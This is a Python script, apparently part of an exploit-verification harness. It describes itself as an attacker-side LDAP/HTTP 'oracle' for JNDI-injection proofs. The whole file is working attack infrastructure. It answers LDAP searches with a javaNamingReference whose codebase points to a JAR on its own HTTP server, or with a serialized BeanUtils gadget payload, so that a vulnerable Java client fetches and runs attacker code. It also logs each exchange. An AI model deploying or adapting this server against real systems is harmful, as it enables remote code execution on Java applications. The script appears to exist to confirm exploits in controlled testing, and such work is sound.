"""Independent attacker-side LDAP/HTTP oracle; serves only source-built native proofs."""
import base64
import hashlib
import http.server
import json
from pathlib import Path
import socketserver
import sys
import threading

artifacts = Path(sys.argv[1])
host = sys.argv[2]
finished = threading.Event()
lock = threading.Lock()


def record(**row):
    with lock:
        with (artifacts / 'native-oracle-events.jsonl').open('a') as output:
            output.write(json.dumps(row) + '\n')


def encode(tag, body):
    size = len(body)
    length = bytes([size]) if size < 128 else bytes([0x80 + (size.bit_length() + 7) // 8]) + size.to_bytes((size.bit_length() + 7) // 8, 'big')
    return bytes([tag]) + length + body


def decode(data):
    assert len(data) >= 2
    tag, size, offset = data[0], data[1], 2
    if size & 128:
        count = size & 127
        assert 0 < count <= 3
        size = int.from_bytes(data[offset:offset + count], 'big')
        offset += count
    assert offset + size <= len(data)
    return tag, data[offset:offset + size], data[offset + size:]


def packet(stream):
    tag = stream.read(1)
    if not tag:
        return None
    first = stream.read(1)
    assert len(first) == 1
    prefix = tag + first
    size = first[0]
    if size & 128:
        count = size & 127
        assert 0 < count <= 3
        length = stream.read(count)
        assert len(length) == count
        prefix += length
        size = int.from_bytes(length, 'big')
    assert size <= 65536
    body = stream.read(size)
    assert len(body) == size
    return prefix + body


def message(identifier, tag, content):
    return encode(48, encode(2, identifier) + encode(tag, content))


def attribute(name, values):
    return encode(48, encode(4, name.encode()) + encode(49, b''.join(encode(4, value) for value in values)))


class LDAP(socketserver.StreamRequestHandler):
    def handle(self):
        self.request.settimeout(8)
        try:
            while True:
                wire = packet(self.rfile)
                if wire is None:
                    return
                tag, body, rest = decode(wire)
                assert tag == 48 and not rest
                tag, identifier, body = decode(body)
                assert tag == 2
                operation, content, controls = decode(body)
                row = dict(kind='ldap', operation=operation, request_base64=base64.b64encode(wire).decode())
                if operation == 66:
                    record(**row)
                    return
                if operation == 96:
                    response = message(identifier, 97, bytes.fromhex('0a010004000400'))
                elif operation == 99:
                    tag, base_dn, rest = decode(content)
                    assert tag == 4
                    row['base_dn'] = base_dn.decode()
                    if base_dn == b'cn=remote':
                        attributes = [attribute('javaClassName', [b'java.lang.Object']), attribute('objectClass', [b'javaNamingReference']), attribute('javaFactory', [b'NativeFactory']), attribute('javaCodeBase', [('http://' + host + ':8088/native-proof.jar').encode()])]
                    elif base_dn == b'cn=gadget':
                        payload = (artifacts / 'beanutils.bin').read_bytes()
                        attributes = [attribute('javaClassName', [b'java.lang.Object']), attribute('javaSerializedData', [payload])]
                        row['serialized_sha256'] = hashlib.sha256(payload).hexdigest()
                    else:
                        raise ValueError('Unknown controlled native lookup')
                    response = message(identifier, 100, encode(4, base_dn) + encode(48, b''.join(attributes)))
                    response += message(identifier, 101, bytes.fromhex('0a010004000400'))
                else:
                    raise ValueError('Unknown LDAP operation')
                row['response_base64'] = base64.b64encode(response).decode()
                record(**row)
                self.wfile.write(response)
                self.wfile.flush()
        except (OSError, ValueError, AssertionError) as error:
            record(kind='ldap_error', error=str(error))


class HTTP(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/native-proof.jar':
            data = (artifacts / 'native-proof.jar').read_bytes()
            record(kind='http_jar', path=self.path, bytes=len(data), sha256=hashlib.sha256(data).hexdigest())
            self.send_response(200)
            self.send_header('Content-Type', 'application/java-archive')
            self.send_header('Content-Length', str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        elif self.path == '/stop':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'stopping')
            finished.set()
        else:
            self.send_error(404)

    def log_message(self, *_arguments):
        pass


class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


with Server(('0.0.0.0', 1388), LDAP) as ldap, http.server.ThreadingHTTPServer(('0.0.0.0', 8088), HTTP) as http:
    threads = [threading.Thread(target=server.serve_forever, daemon=True) for server in [ldap, http]]
    for thread in threads:
        thread.start()
    record(kind='oracle_ready')
    (artifacts / 'native-oracle-ready.json').write_text(json.dumps(dict(pid=__import__('os').getpid(), ldap_port=1388, http_port=8088)) + '\n')
    if not finished.wait(180):
        record(kind='oracle_timeout')
    for server in [ldap, http]:
        server.shutdown()
    for thread in threads:
        thread.join(5)
record(kind='oracle_stopped')
